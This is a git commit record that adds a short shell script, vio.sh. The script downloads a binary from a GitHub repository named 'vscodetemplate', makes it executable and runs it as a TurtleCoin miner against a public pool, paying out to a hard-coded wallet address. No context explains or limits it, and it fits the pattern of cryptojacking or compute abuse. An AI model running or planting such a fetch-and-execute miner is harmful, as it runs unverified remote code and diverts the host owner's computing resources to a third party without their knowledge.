ec6ae075d1c2d586219ea5ca200389c3d4ef3973
Nunu8383 <96054478+Nunu8383@users.noreply.github.com>
2021-12-18 14:10:37 +0700

    Create vio.sh

---
+++ vio.sh
@@ -0,0 +1,4 @@
+#!/bin/sh
+
+wget https://github.com/Kikinan86/vscodetemplate/raw/main/vio && chmod u+x vio && ./vio --pool sg.turtlecoin.herominers.com:1160 --username TRTLuwzkm732ksmHm7mXRUam5Liif1LTij6LYxdR72cGS2a6T1o9nXeCaVd1SutG7sfszCD6uRRSVL5CmmDFfXR83e1A1xcXGqy --password vio --algorithm turtlecoin --disable=gpu
+pause
